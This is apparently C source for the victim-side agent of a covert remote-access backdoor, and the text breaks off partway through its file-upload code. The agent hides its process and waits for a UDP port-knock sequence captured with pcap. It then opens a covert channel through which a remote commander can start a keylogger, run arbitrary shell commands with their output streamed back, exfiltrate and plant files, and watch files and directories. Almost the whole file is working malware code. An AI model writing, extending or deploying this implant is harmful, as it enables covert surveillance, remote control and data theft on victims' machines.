#include <arpa/inet.h>
#include <dirent.h>
#include <errno.h>
#include "keylogger.h"
#include <pcap.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
#ifdef __linux__
#include <sys/prctl.h>
#endif

#include "protocol.h"

#define RESPONSE_TEXT_MAX 256
#define EXEC_COMMAND_MAX 1024
#define EXEC_OUTPUT_CHUNK_MAX PROTOCOL_PACKET_PAYLOAD_MAX
#define PCAP_SNAPLEN 65535
#define PCAP_TIMEOUT_MS 500

typedef struct {
    int active;
    int exists;
    char path[REMOTE_PATH_MAX];
    time_t mtime;
    off_t size;
    uint64_t signature;
} watch_state_t;

typedef struct {
    pcap_t *pcap_handle;
    int covert_sock;
    int collector_sock;

    int knock_index;
    struct in_addr knock_addr;
    struct timeval knock_started_at;
    int knock_complete;
    struct in_addr pending_peer;

    int session_active;
    struct in_addr allowed_addr;
    struct sockaddr_in peer_addr;
    char peer_ip[INET_ADDRSTRLEN];
    uint32_t expected_seq;
    uint32_t next_seq;

    keylogger_state_t keylogger;
    FILE *upload_fp;
    char upload_path[REMOTE_PATH_MAX];
    char upload_temp_path[REMOTE_PATH_MAX + 8];
    watch_state_t file_watch;
    watch_state_t directory_watch;
} victim_state_t;

static volatile sig_atomic_t g_running = 1;

static void handle_signal(int signo);
static void init_state(victim_state_t *state);
static int open_pcap(victim_state_t *state);
static void close_pcap(victim_state_t *state);
static int bind_udp_socket(uint16_t port);
static void close_session_sockets(victim_state_t *state);
static int run_victim(victim_state_t *state);
static void poll_knock_state_pcap(victim_state_t *state);
static void poll_session_state(victim_state_t *state);
static void poll_watch_targets(victim_state_t *state);
static void pcap_knock_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
static void reset_knock_state(victim_state_t *state);
static void maybe_reset_knock_timeout(victim_state_t *state);
static long elapsed_ms(const struct timeval *start);
static void activate_session(victim_state_t *state, const struct in_addr *peer_addr);
static void deactivate_session(victim_state_t *state, const char *reason);
static void clear_upload_state(victim_state_t *state);
static void clear_watch_targets(victim_state_t *state);
static void handle_covert_packet(victim_state_t *state);
static int send_response(victim_state_t *state, const struct sockaddr_in *peer_addr, uint8_t command, const char *message);
static int send_response_payload(victim_state_t *state, const struct sockaddr_in *peer_addr, uint8_t command, const uint8_t *payload, uint16_t payload_len);
static int wait_for_stream_ack(victim_state_t *state);
static int process_command(victim_state_t *state, const struct sockaddr_in *peer_addr, const parsed_packet_t *packet);
static int start_keylogger(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len);
static int stop_keylogger(victim_state_t *state, char *message, size_t message_len);
static int execute_command(victim_state_t *state, const struct sockaddr_in *peer_addr, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len);
static int send_file_to_commander(victim_state_t *state, const struct sockaddr_in *peer_addr, const uint8_t *payload, uint16_t payload_len);
static int begin_file_upload(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len);
static int write_file_upload_chunk(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len);
static int finish_file_upload(victim_state_t *state, char *message, size_t message_len);
static int watch_remote_file(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len);
static int watch_remote_directory(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len);
static int snapshot_file_watch(const char *path, watch_state_t *watch);
static int snapshot_directory_watch(const char *path, watch_state_t *watch);
static uint64_t compute_directory_signature(const char *path, int *exists, time_t *mtime);
static void send_watch_event(victim_state_t *state, const char *label, const char *path, const char *details);
static int copy_payload_string(const uint8_t *payload, uint16_t payload_len, const char *field_name, char *out, size_t out_len, char *error, size_t error_len);
static size_t bounded_strlen(const uint8_t *data, size_t limit);
static int send_watch_message(const struct in_addr *target_addr, const char *payload, int payload_len);
static void conceal_process(void);

int main(void) {
    victim_state_t state;

    setvbuf(stdout, NULL, _IOLBF, 0);
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    conceal_process();

    init_state(&state);
    if (open_pcap(&state) != 0) {
        fprintf(stderr, "Unable to open capture interface; try running as root\n");
        close_pcap(&state);
        return EXIT_FAILURE;
    }

    printf("Victim agent started (pcap-based knock detection)\n");

    (void)run_victim(&state);

    (void)keylogger_stop(&state.keylogger, NULL, 0);
    clear_upload_state(&state);
    clear_watch_targets(&state);
    close_session_sockets(&state);
    close_pcap(&state);
    keylogger_state_destroy(&state.keylogger);
    printf("Victim agent exiting\n");
    return EXIT_SUCCESS;
}

static void handle_signal(int signo) {
    (void)signo;
    g_running = 0;
}

static void init_state(victim_state_t *state) {
    memset(state, 0, sizeof(*state));

    state->pcap_handle = NULL;
    state->covert_sock = -1;
    state->collector_sock = -1;
    state->expected_seq = SEQ_INIT;
    state->next_seq = SEQ_INIT;
    keylogger_state_init(&state->keylogger);
}

static int open_pcap(victim_state_t *state) {
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program filter;
    char filter_expr[128];

    state->pcap_handle = pcap_open_live(
        "lo0",
        PCAP_SNAPLEN,
        1,
        PCAP_TIMEOUT_MS,
        errbuf
    );
    if (state->pcap_handle == NULL) {
        state->pcap_handle = pcap_open_live(
            "lo",
            PCAP_SNAPLEN,
            1,
            PCAP_TIMEOUT_MS,
            errbuf
        );
    }
    if (state->pcap_handle == NULL) {
        pcap_if_t *alldevs;
        if (pcap_findalldevs(&alldevs, errbuf) == 0 && alldevs != NULL) {
            state->pcap_handle = pcap_open_live(
                alldevs->name,
                PCAP_SNAPLEN,
                1,
                PCAP_TIMEOUT_MS,
                errbuf
            );
            pcap_freealldevs(alldevs);
        }
    }
    if (state->pcap_handle == NULL) {
        return -1;
    }

    snprintf(filter_expr, sizeof(filter_expr),
             "udp dst portrange %u-%u",
             (unsigned)KNOCK_PORT_BASE,
             (unsigned)(KNOCK_PORT_BASE + KNOCK_PORT_COUNT - 1));

    if (pcap_compile(state->pcap_handle, &filter, filter_expr, 1, PCAP_NETMASK_UNKNOWN) == 0) {
        (void)pcap_setfilter(state->pcap_handle, &filter);
        pcap_freecode(&filter);
    }

    return 0;
}

static void close_pcap(victim_state_t *state) {
    if (state->pcap_handle != NULL) {
        pcap_close(state->pcap_handle);
        state->pcap_handle = NULL;
    }
}

static int bind_udp_socket(uint16_t port) {
    int sock;
    int enabled = 1;
    struct sockaddr_in addr;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &enabled, sizeof(enabled)) != 0) {
        perror("setsockopt SO_REUSEADDR");
        close(sock);
        return -1;
    }

#ifdef SO_REUSEPORT
    (void)setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &enabled, sizeof(enabled));
#endif

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(port);

    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        fprintf(stderr, "bind UDP port %u failed: %s\n", (unsigned)port, strerror(errno));
        close(sock);
        return -1;
    }

    return sock;
}

static void close_session_sockets(victim_state_t *state) {
    if (state->covert_sock >= 0) {
        close(state->covert_sock);
        state->covert_sock = -1;
    }
    if (state->collector_sock >= 0) {
        close(state->collector_sock);
        state->collector_sock = -1;
    }
}

static int run_victim(victim_state_t *state) {
    while (g_running) {
        if (state->session_active) {
            poll_session_state(state);
            poll_watch_targets(state);
        } else {
            poll_knock_state_pcap(state);
        }
    }

    return 0;
}

static void poll_knock_state_pcap(victim_state_t *state) {
    maybe_reset_knock_timeout(state);

    while (pcap_dispatch(state->pcap_handle, -1, pcap_knock_handler, (u_char *)state) > 0) {
    }

    if (state->knock_complete) {
        state->knock_complete = 0;
        activate_session(state, &state->pending_peer);
    }

    if (!g_running) {
        return;
    }
}

static void poll_session_state(victim_state_t *state) {
    fd_set read_fds;
    struct timeval timeout;
    int ready;

    FD_ZERO(&read_fds);
    FD_SET(state->covert_sock, &read_fds);

    timeout.tv_sec = 1;
    timeout.tv_usec = 0;

    ready = select(state->covert_sock + 1, &read_fds, NULL, NULL, &timeout);
    if (ready < 0) {
        if (errno != EINTR) {
            perror("select");
            g_running = 0;
        }
        return;
    }

    if (ready > 0 && FD_ISSET(state->covert_sock, &read_fds)) {
        handle_covert_packet(state);
    }
}

static void poll_watch_targets(victim_state_t *state) {
    watch_state_t current;

    if (!state->session_active) {
        return;
    }

    if (state->file_watch.active) {
        memset(&current, 0, sizeof(current));
        if (snapshot_file_watch(state->file_watch.path, &current) != 0) {
            if (state->file_watch.exists) {
                send_watch_event(state, "File watch", state->file_watch.path, "target became unavailable");
                state->file_watch.exists = 0;
            }
        } else if (!state->file_watch.exists) {
            send_watch_event(state, "File watch", state->file_watch.path, "target became available");
            state->file_watch.exists = 1;
            state->file_watch.mtime = current.mtime;
            state->file_watch.size = current.size;
        } else if (state->file_watch.mtime != current.mtime || state->file_watch.size != current.size) {
            char details[FILE_CHUNK];

            snprintf(details, sizeof(details), "changed (size=%lld)", (long long)current.size);
            send_watch_event(state, "File watch", state->file_watch.path, details);
            state->file_watch.mtime = current.mtime;
            state->file_watch.size = current.size;
        }
    }

    if (state->directory_watch.active) {
        memset(&current, 0, sizeof(current));
        if (snapshot_directory_watch(state->directory_watch.path, &current) != 0) {
            if (state->directory_watch.exists) {
                send_watch_event(state, "Directory watch", state->directory_watch.path, "target became unavailable");
                state->directory_watch.exists = 0;
            }
        } else if (!state->directory_watch.exists) {
            send_watch_event(state, "Directory watch", state->directory_watch.path, "target became available");
            state->directory_watch.exists = 1;
            state->directory_watch.mtime = current.mtime;
            state->directory_watch.signature = current.signature;
        } else if (state->directory_watch.mtime != current.mtime ||
                   state->directory_watch.signature != current.signature) {
            send_watch_event(state, "Directory watch", state->directory_watch.path, "directory contents changed");
            state->directory_watch.mtime = current.mtime;
            state->directory_watch.signature = current.signature;
        }
    }
}

static void pcap_knock_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    victim_state_t *state = (victim_state_t *)args;
    const u_char *ip_hdr;
    uint16_t ether_type;
    int ip_header_len;
    uint16_t dst_port;
    struct in_addr src_addr;
    uint8_t payload_byte;
    uint16_t udp_len;
    int datalink;

    (void)header;

    datalink = pcap_datalink(state->pcap_handle);

    if (datalink == DLT_NULL) {
        uint32_t family;
        memcpy(&family, packet, 4);
        if (family != 2) {
            return;
        }
        ip_hdr = packet + 4;
    } else if (datalink == DLT_EN10MB) {
        memcpy(&ether_type, packet + 12, 2);
        if (ntohs(ether_type) != 0x0800) {
            return;
        }
        ip_hdr = packet + 14;
    } else if (datalink == DLT_RAW) {
        ip_hdr = packet;
    } else {
        return;
    }

    if ((ip_hdr[0] & 0xF0) != 0x40) {
        return;
    }
    if (ip_hdr[9] != 17) {
        return;
    }

    ip_header_len = (ip_hdr[0] & 0x0F) * 4;
    (void)memcpy(&src_addr, ip_hdr + 12, 4);

    {
        const u_char *udp_hdr = ip_hdr + ip_header_len;
        uint16_t src_port;
        memcpy(&src_port, udp_hdr, 2);
        memcpy(&dst_port, udp_hdr + 2, 2);
        dst_port = ntohs(dst_port);
        memcpy(&udp_len, udp_hdr + 4, 2);
        udp_len = ntohs(udp_len);

        if (udp_len < 9) {
            return;
        }

        payload_byte = udp_hdr[8];
        (void)src_port;
    }

    if (dst_port < KNOCK_PORT_BASE || dst_port > (uint16_t)(KNOCK_PORT_BASE + KNOCK_PORT_COUNT - 1)) {
        return;
    }

    {
        int knock_index = (int)(dst_port - KNOCK_PORT_BASE);
        uint8_t expected_value = (uint8_t)knock_index;
        char src_ip[INET_ADDRSTRLEN];

        inet_ntop(AF_INET, &src_addr, src_ip, sizeof(src_ip));

        if (state->knock_index > 0 &&
            src_addr.s_addr != state->knock_addr.s_addr) {
            printf("Knock source changed; restarting sequence\n");
            reset_knock_state(state);
            return;
        }

        if (knock_index != state->knock_index || payload_byte != expected_value) {
            if (knock_index == 0 && payload_byte == 0) {
                reset_knock_state(state);
            } else {
                printf("Unexpected knock on port %u from %s; sequence reset\n",
                       (unsigned)dst_port, src_ip);
                reset_knock_state(state);
            }
            return;
        }

        if (state->knock_index == 0) {
            state->knock_addr = src_addr;
            gettimeofday(&state->knock_started_at, NULL);
        }

        state->knock_index++;
        printf("Accepted knock %d/%d from %s\n", state->knock_index, KNOCK_PORT_COUNT, src_ip);

        if (state->knock_index == KNOCK_PORT_COUNT) {
            state->knock_complete = 1;
            state->pending_peer = src_addr;
        }
    }
}

static void reset_knock_state(victim_state_t *state) {
    state->knock_index = 0;
    memset(&state->knock_addr, 0, sizeof(state->knock_addr));
    memset(&state->knock_started_at, 0, sizeof(state->knock_started_at));
}

static void maybe_reset_knock_timeout(victim_state_t *state) {
    if (state->knock_index > 0 && elapsed_ms(&state->knock_started_at) > KNOCK_TIMEOUT_MS) {
        printf("Knock sequence timed out; waiting for a fresh sequence\n");
        reset_knock_state(state);
    }
}

static long elapsed_ms(const struct timeval *start) {
    struct timeval now;
    long seconds;
    long micros;

    gettimeofday(&now, NULL);
    seconds = now.tv_sec - start->tv_sec;
    micros = now.tv_usec - start->tv_usec;

    return seconds * 1000L + micros / 1000L;
}

static void activate_session(victim_state_t *state, const struct in_addr *peer_addr) {
    close_pcap(state);

    state->covert_sock = bind_udp_socket(COVERT_PORT);
    if (state->covert_sock < 0) {
        fprintf(stderr, "Unable to bind covert port; session cannot start\n");
        if (open_pcap(state) != 0) {
            g_running = 0;
        }
        reset_knock_state(state);
        return;
    }

    state->collector_sock = bind_udp_socket(COLLECTOR_PORT);
    if (state->collector_sock < 0) {
        close(state->covert_sock);
        state->covert_sock = -1;
        fprintf(stderr, "Unable to bind collector port; session cannot start\n");
        if (open_pcap(state) != 0) {
            g_running = 0;
        }
        reset_knock_state(state);
        return;
    }

    reset_knock_state(state);
    state->session_active = 1;
    state->allowed_addr = *peer_addr;
    state->expected_seq = SEQ_INIT;
    state->next_seq = SEQ_INIT;

    memset(&state->peer_addr, 0, sizeof(state->peer_addr));
    state->peer_addr.sin_family = AF_INET;
    state->peer_addr.sin_addr = *peer_addr;
    state->peer_addr.sin_port = htons(COVERT_PORT);

    inet_ntop(AF_INET, peer_addr, state->peer_ip, sizeof(state->peer_ip));
    printf("Session opened for %s on UDP port %u\n", state->peer_ip, (unsigned)COVERT_PORT);
}

static void deactivate_session(victim_state_t *state, const char *reason) {
    (void)keylogger_stop(&state->keylogger, NULL, 0);

    clear_upload_state(state);
    clear_watch_targets(state);

    printf("Session closed");
    if (reason != NULL && reason[0] != '\0') {
        printf(": %s", reason);
    }
    printf("\n");

    state->session_active = 0;
    memset(&state->allowed_addr, 0, sizeof(state->allowed_addr));
    memset(&state->peer_addr, 0, sizeof(state->peer_addr));
    state->peer_ip[0] = '\0';
    state->expected_seq = SEQ_INIT;
    state->next_seq = SEQ_INIT;
    reset_knock_state(state);

    close_session_sockets(state);

    if (open_pcap(state) != 0) {
        fprintf(stderr, "Unable to reopen capture; victim will exit\n");
        g_running = 0;
    }
}

static void clear_upload_state(victim_state_t *state) {
    if (state->upload_fp != NULL) {
        fclose(state->upload_fp);
        state->upload_fp = NULL;
    }

    if (state->upload_temp_path[0] != '\0') {
        remove(state->upload_temp_path);
        state->upload_temp_path[0] = '\0';
    }

    state->upload_path[0] = '\0';
}

static void clear_watch_targets(victim_state_t *state) {
    memset(&state->file_watch, 0, sizeof(state->file_watch));
    memset(&state->directory_watch, 0, sizeof(state->directory_watch));
}

static void handle_covert_packet(victim_state_t *state) {
    uint8_t packet[PACKET_SIZE_MAX];
    struct sockaddr_in src_addr;
    socklen_t src_len = sizeof(src_addr);
    ssize_t received;
    parsed_packet_t parsed;
    char error[RESPONSE_TEXT_MAX];
    char src_ip[INET_ADDRSTRLEN];

    received = recvfrom(
        state->covert_sock,
        packet,
        sizeof(packet),
        0,
        (struct sockaddr *)&src_addr,
        &src_len
    );

    if (received < 0) {
        if (errno != EINTR) {
            perror("recvfrom covert");
        }
        return;
    }

    inet_ntop(AF_INET, &src_addr.sin_addr, src_ip, sizeof(src_ip));

    if (!state->session_active) {
        printf("Ignoring covert packet from %s without an active session\n", src_ip);
        return;
    }

    if (src_addr.sin_addr.s_addr != state->allowed_addr.s_addr) {
        printf("Ignoring covert packet from unauthorized peer %s\n", src_ip);
        return;
    }

    state->peer_addr = src_addr;

    if (protocol_parse_packet(packet, (size_t)received, &parsed, error, sizeof(error)) != 0) {
        fprintf(stderr, "Invalid packet from %s: %s\n", src_ip, error);
        (void)send_response(state, &src_addr, CMD_ERROR, error);
        return;
    }

    if (parsed.seq_num < state->expected_seq) {
        printf("Ignoring stale command sequence 0x%08x (expected 0x%08x)\n",
               parsed.seq_num,
               state->expected_seq);
        return;
    }

    if (parsed.seq_num != state->expected_seq) {
        fprintf(stderr, "Command sequence mismatch: received 0x%08x, expected 0x%08x\n",
                parsed.seq_num,
                state->expected_seq);
        (void)send_response(state, &src_addr, CMD_ERROR, "sequence mismatch");
        return;
    }

    state->expected_seq++;

    printf("Command %s (0x%02x) received from %s\n",
           protocol_command_name(parsed.command),
           parsed.command,
           src_ip);

    if (process_command(state, &src_addr, &parsed) != 0) {
        fprintf(stderr, "Command %s failed\n", protocol_command_name(parsed.command));
    }
}

static int send_response(victim_state_t *state, const struct sockaddr_in *peer_addr, uint8_t command, const char *message) {
    uint16_t payload_len = 0;

    if (message != NULL) {
        size_t message_len = strlen(message) + 1;
        if (message_len > EXEC_OUTPUT_CHUNK_MAX) {
            message_len = EXEC_OUTPUT_CHUNK_MAX;
        }
        payload_len = (uint16_t)message_len;
    }

    return send_response_payload(state, peer_addr, command, (const uint8_t *)message, payload_len);
}

static int send_response_payload(victim_state_t *state, const struct sockaddr_in *peer_addr, uint8_t command, const uint8_t *payload, uint16_t payload_len) {
    uint8_t packet[PACKET_SIZE_MAX];
    size_t packet_len;
    ssize_t sent;
    char error[128];

    if (payload_len > PROTOCOL_PACKET_PAYLOAD_MAX) {
        payload_len = (uint16_t)EXEC_OUTPUT_CHUNK_MAX;
    }

    packet_len = protocol_build_packet(
        state->next_seq++,
        command,
        payload,
        payload_len,
        packet,
        sizeof(packet),
        error,
        sizeof(error)
    );
    if (packet_len == 0) {
        fprintf(stderr, "Unable to build response packet: %s\n", error);
        return -1;
    }

    sent = sendto(
        state->covert_sock,
        packet,
        packet_len,
        0,
        (const struct sockaddr *)peer_addr,
        sizeof(*peer_addr)
    );

    if (sent != (ssize_t)packet_len) {
        perror("sendto response");
        return -1;
    }

    return 0;
}

static int wait_for_stream_ack(victim_state_t *state) {
    uint8_t packet[PACKET_SIZE_MAX];
    parsed_packet_t parsed;
    struct sockaddr_in src_addr;
    socklen_t src_len = sizeof(src_addr);
    fd_set read_fds;
    struct timeval timeout;
    ssize_t received;
    char error[RESPONSE_TEXT_MAX];

    while (1) {
        int ready;

        FD_ZERO(&read_fds);
        FD_SET(state->covert_sock, &read_fds);
        timeout.tv_sec = RESPONSE_TIMEOUT_MS / 1000;
        timeout.tv_usec = (RESPONSE_TIMEOUT_MS % 1000) * 1000;

        ready = select(state->covert_sock + 1, &read_fds, NULL, NULL, &timeout);
        if (ready < 0) {
            if (errno == EINTR) {
                continue;
            }
            perror("select stream ack");
            return -1;
        }

        if (ready == 0) {
            fprintf(stderr, "Timed out waiting for commander ACK\n");
            return -1;
        }

        received = recvfrom(
            state->covert_sock,
            packet,
            sizeof(packet),
            0,
            (struct sockaddr *)&src_addr,
            &src_len
        );
        if (received < 0) {
            if (errno == EINTR) {
                continue;
            }
            perror("recvfrom stream ack");
            return -1;
        }

        if (src_addr.sin_addr.s_addr != state->allowed_addr.s_addr ||
            src_addr.sin_port != state->peer_addr.sin_port) {
            continue;
        }

        if (protocol_parse_packet(packet, (size_t)received, &parsed, error, sizeof(error)) != 0) {
            fprintf(stderr, "Invalid stream ACK: %s\n", error);
            return -1;
        }

        if (parsed.seq_num < state->expected_seq) {
            continue;
        }

        if (parsed.seq_num != state->expected_seq || parsed.command != CMD_ACK) {
            fprintf(stderr, "Unexpected stream ACK packet: %s seq=0x%08x expected=0x%08x\n",
                    protocol_command_name(parsed.command),
                    parsed.seq_num,
                    state->expected_seq);
            return -1;
        }

        state->expected_seq++;
        return 0;
    }
}

static int process_command(victim_state_t *state, const struct sockaddr_in *peer_addr, const parsed_packet_t *packet) {
    char message[RESPONSE_TEXT_MAX];
    int result = 0;

    switch (packet->command) {
        case CMD_HEARTBEAT:
            snprintf(message, sizeof(message), "heartbeat ok");
            result = send_response(state, peer_addr, CMD_ACK, message);
            break;

        case CMD_KEYLOG_START:
            if (start_keylogger(state, packet->payload, packet->payload_len, message, sizeof(message)) == 0) {
                result = send_response(state, peer_addr, CMD_OK, message);
            } else {
                result = send_response(state, peer_addr, CMD_ERROR, message);
            }
            break;

        case CMD_KEYLOG_STOP:
            if (stop_keylogger(state, message, sizeof(message)) == 0) {
                result = send_response(state, peer_addr, CMD_OK, message);
            } else {
                result = send_response(state, peer_addr, CMD_ERROR, message);
            }
            break;

        case CMD_EXEC_CMD:
            if (execute_command(state, peer_addr, packet->payload, packet->payload_len, message, sizeof(message)) == 0) {
                result = send_response(state, peer_addr, CMD_OK, message);
            } else {
                result = send_response(state, peer_addr, CMD_ERROR, message);
            }
            break;

        case CMD_FILE_GET:
            result = send_file_to_commander(state, peer_addr, packet->payload, packet->payload_len);
            break;

        case CMD_FILE_PUT_BEGIN:
            if (begin_file_upload(state, packet->payload, packet->payload_len, message, sizeof(message)) == 0) {
                result = send_response(state, peer_addr, CMD_ACK, message);
            } else {
                result = send_response(state, peer_addr, CMD_ERROR, message);
            }
            break;

        case CMD_FILE_PUT_CHUNK:
            if (write_file_upload_chunk(state, packet->payload, packet->payload_len, message, sizeof(message)) == 0) {
                result = send_response(state, peer_addr, CMD_ACK, message);
            } else {
                result = send_response(state, peer_addr, CMD_ERROR, message);
            }
            break;

        case CMD_FILE_PUT_END:
            if (finish_file_upload(state, message, sizeof(message)) == 0) {
                result = send_response(state, peer_addr, CMD_OK, message);
            } else {
                result = send_response(state, peer_addr, CMD_ERROR, message);
            }
            break;

        case CMD_WATCH_FILE:
            if (watch_remote_file(state, packet->payload, packet->payload_len, message, sizeof(message)) == 0) {
                result = send_response(state, peer_addr, CMD_OK, message);
            } else {
                result = send_response(state, peer_addr, CMD_ERROR, message);
            }
            break;

        case CMD_WATCH_DIR:
            if (watch_remote_directory(state, packet->payload, packet->payload_len, message, sizeof(message)) == 0) {
                result = send_response(state, peer_addr, CMD_OK, message);
            } else {
                result = send_response(state, peer_addr, CMD_ERROR, message);
            }
            break;

        case CMD_DISCONNECT:
            result = send_response(state, peer_addr, CMD_ACK, "disconnect ok");
            deactivate_session(state, "commander disconnected");
            break;

        case CMD_UNINSTALL:
            result = send_response(state, peer_addr, CMD_ACK, "uninstall ok");
            deactivate_session(state, "uninstall requested");
            g_running = 0;
            break;

        default:
            snprintf(message, sizeof(message), "unknown command 0x%02x", packet->command);
            result = send_response(state, peer_addr, CMD_ERROR, message);
            break;
    }

    return result;
}

static int start_keylogger(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len) {
    char device_path[KEYLOGGER_DEVICE_MAX];
    char error[RESPONSE_TEXT_MAX];
    const char *selected_device;

    if (copy_payload_string(payload, payload_len, "device path", device_path, sizeof(device_path), error, sizeof(error)) != 0) {
        snprintf(message, message_len, "keylogger start failed: %s", error);
        return -1;
    }

    selected_device = (strcmp(device_path, KEYLOGGER_AUTO_DEVICE) == 0) ? keylogger_platform_default_device() : device_path;
    if (keylogger_start(&state->keylogger, selected_device, KEYLOGGER_LOG_FILE, error, sizeof(error)) != 0) {
        snprintf(message, message_len, "keylogger start failed: %s", error);
        return -1;
    }

    snprintf(message, message_len, "keylogger started for %s", selected_device);
    printf("%s; keylog: %s\n", message, KEYLOGGER_LOG_FILE);

    return 0;
}

static int stop_keylogger(victim_state_t *state, char *message, size_t message_len) {
    if (!state->keylogger.active) {
        snprintf(message, message_len, "keylogger already stopped");
        return 0;
    }

    if (keylogger_stop(&state->keylogger, message, message_len) != 0) {
        snprintf(message, message_len, "keylogger stop failed: %s", message);
        return -1;
    }

    snprintf(message, message_len, "keylogger stopped");
    printf("%s\n", message);

    return 0;
}

static int execute_command(victim_state_t *state, const struct sockaddr_in *peer_addr, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len) {
    char command[EXEC_COMMAND_MAX];
    char error[RESPONSE_TEXT_MAX];
    uint8_t buffer[EXEC_OUTPUT_CHUNK_MAX];
    int pipefd[2];
    pid_t child;
    int status = 0;
    int read_error = 0;
    int sent_output = 0;

    if (copy_payload_string(payload, payload_len, "command", command, sizeof(command), error, sizeof(error)) != 0) {
        snprintf(message, message_len, "command failed: %s", error);
        return -1;
    }

    if (command[0] == '\0') {
        snprintf(message, message_len, "command failed: empty command");
        return -1;
    }

    if (pipe(pipefd) != 0) {
        snprintf(message, message_len, "command failed: pipe: %s", strerror(errno));
        return -1;
    }

    child = fork();
    if (child < 0) {
        snprintf(message, message_len, "command failed: fork: %s", strerror(errno));
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    if (child == 0) {
        close(pipefd[0]);
        (void)dup2(pipefd[1], STDOUT_FILENO);
        (void)dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);
        execl("/bin/sh", "sh", "-c", command, (char *)NULL);
        _exit(127);
    }

    close(pipefd[1]);
    printf("Executing command from commander: %s\n", command);

    while (1) {
        ssize_t n = read(pipefd[0], buffer, sizeof(buffer));

        if (n > 0) {
            sent_output = 1;
            if (send_response_payload(state, peer_addr, CMD_EXEC_OUTPUT, buffer, (uint16_t)n) != 0) {
                read_error = 1;
            } else if (wait_for_stream_ack(state) != 0) {
                read_error = 1;
            }
            continue;
        }

        if (n == 0) {
            break;
        }

        if (errno == EINTR) {
            continue;
        }

        read_error = 1;
        snprintf(message, message_len, "command failed while reading output: %s", strerror(errno));
        break;
    }

    close(pipefd[0]);

    if (waitpid(child, &status, 0) < 0) {
        snprintf(message, message_len, "command failed: waitpid: %s", strerror(errno));
        return -1;
    }

    if (read_error) {
        return -1;
    }

    if (!sent_output) {
        static const char no_output[] = "(no output)\n";
        if (send_response_payload(state, peer_addr, CMD_EXEC_OUTPUT, (const uint8_t *)no_output, (uint16_t)(sizeof(no_output) - 1)) != 0) {
            snprintf(message, message_len, "command failed while sending output");
            return -1;
        }
    }

    if (WIFEXITED(status)) {
        snprintf(message, message_len, "command exited with status %d", WEXITSTATUS(status));
        return WEXITSTATUS(status) == 0 ? 0 : -1;
    }

    if (WIFSIGNALED(status)) {
        snprintf(message, message_len, "command terminated by signal %d", WTERMSIG(status));
        return -1;
    }

    snprintf(message, message_len, "command ended unexpectedly");
    return -1;
}

static int send_file_to_commander(victim_state_t *state, const struct sockaddr_in *peer_addr, const uint8_t *payload, uint16_t payload_len) {
    char path[REMOTE_PATH_MAX];
    char error[RESPONSE_TEXT_MAX];
    uint8_t buffer[EXEC_OUTPUT_CHUNK_MAX];
    FILE *fp;
    size_t bytes_read;
    int failed = 0;

    if (copy_payload_string(payload, payload_len, "remote path", path, sizeof(path), error, sizeof(error)) != 0) {
        return send_response(state, peer_addr, CMD_ERROR, error);
    }

    fp = fopen(path, "rb");
    if (fp == NULL) {
        snprintf(error, sizeof(error), "file transfer failed: %s", strerror(errno));
        return send_response(state, peer_addr, CMD_ERROR, error);
    }

    while ((bytes_read = fread(buffer, 1, sizeof(buffer), fp)) > 0) {
        if (send_response_payload(state, peer_addr, CMD_FILE_DATA, buffer, (uint16_t)bytes_read) != 0) {
            failed = 1;
            break;
        }

        if (wait_for_stream_ack(state) != 0) {
            failed = 1;
            break;
        }
    }

    if (ferror(fp)) {
        snprintf(error, sizeof(error), "file transfer failed while reading %s", path);
        fclose(fp);
        return send_response(state, peer_addr, CMD_ERROR, error);
    }

    fclose(fp);

    if (failed) {
        return -1;
    }

    snprintf(error, sizeof(error), "transferred %s", path);
    return send_response(state, peer_addr, CMD_OK, error);
}

static int begin_file_upload(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len) {
    char path[REMOTE_PATH_MAX];
    char error[RESPONSE_TEXT_MAX];

    if (copy_payload_string(payload, payload_len, "remote path", path, sizeof(path), error, sizeof(error)) != 0) {
        snprintf(message, message_len, "file upload failed: %s", error);
        return -1;
    }

    clear_upload_state(state);
    snprintf(state->upload_path, sizeof(state->upload_path), "%s", path);
    snprintf(state->upload_temp_path, sizeof(state->upload_temp_path), "%s.part", path);
    state->upload_fp = fopen(state->upload_temp_path, "wb");
    if (state->upload_fp == NULL) {
        snprintf(message, message_len, "file upload failed: %s", strerror(errno));
        state->upload_temp_path[0] = '\0';
        state->upload_path[0] = '\0';
        return -1;
    }

    snprintf(message, message_len, "receiving %s", state->upload_path);
    return 0;
}

static int write_file_upload_chunk(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len) {
    if (state->upload_fp == NULL) {
        snprintf(message, message_len, "file upload failed: no active upload");
        return -1;
    }

    if (payload_len == 0) {
        snprintf(message, message_len, "chunk received");
        return 0;
    }

    if (fwrite(payload, 1, payload_len, state->upload_fp) != payload_len) {
        snprintf(message, message_len, "file upload failed while writing %s", state->upload_path);
        clear_upload_state(state);
        return -1;
    }

    snprintf(message, message_len, "chunk received");
    return 0;
}

static int finish_file_upload(victim_state_t *state, char *message, size_t message_len) {
    char completed_path[REMOTE_PATH_MAX];

